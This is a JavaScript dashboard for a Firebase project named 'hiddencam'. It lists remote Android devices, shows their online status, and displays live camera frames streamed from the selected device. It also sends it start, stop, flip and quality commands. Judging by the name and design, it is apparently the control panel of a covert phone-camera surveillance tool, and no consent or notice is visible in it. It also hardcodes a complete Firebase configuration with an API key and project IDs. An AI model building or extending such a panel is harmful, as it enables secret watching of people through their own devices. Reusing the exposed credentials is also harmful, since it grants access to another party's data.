const firebaseConfig = {
    apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
    authDomain: "hiddencam-62e2d.firebaseapp.com",
    databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
    projectId: "hiddencam-62e2d",
    storageBucket: "hiddencam-62e2d.firebasestorage.app",
    messagingSenderId: "931792860891",
    appId: "1:931792860891:android:602d1099f876f4688d7efe"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// 👉 ACTIVE DEVICE (auto first device)
let currentDevice = "droid";

const statusDot = document.getElementById("statusDot");
const deviceStatus = document.getElementById("deviceStatus");
const deviceIdText = document.getElementById("deviceId");
const streamImage = document.getElementById("streamImage");

// ---------------- DEVICES LIST ----------------
db.ref("devices").on("value", snap => {
    const data = snap.val();
    if (!data) return;

    const ids = Object.keys(data);
    currentDevice = ids[0]; // auto select first device

    const device = data[currentDevice];

    const online =
        device.status === "online" &&
        (Date.now() - (device.lastSeen || 0) < 10000);

    if (online) {
        statusDot.className = "status-dot online";
        deviceStatus.innerText = "Device Online";
    } else {
        statusDot.className = "status-dot offline";
        deviceStatus.innerText = "Device Offline";
    }

    deviceIdText.innerText = currentDevice;
});

// ---------------- STREAM ----------------
db.ref("frames/" + currentDevice + "/frame").on("value", snap => {
    const frame = snap.val();
    if (frame) {
        streamImage.src = frame;
    }
});

// ---------------- COMMANDS ----------------
function send(action, value = null) {
    db.ref("commands/" + currentDevice).set({
        action,
        value,
        ts: Date.now()
    });
}

document.getElementById("start").onclick = () => send("start");
document.getElementById("stop").onclick = () => send("stop");
document.getElementById("flip").onclick = () => send("flip");

// ---------------- QUALITY ----------------
document.querySelectorAll(".quality-btn").forEach(btn => {
    btn.onclick = () => {
        document.querySelectorAll(".quality-btn")
        .forEach(b => b.classList.remove("active"));

        btn.classList.add("active");

        send("quality", btn.dataset.q);
    };
});
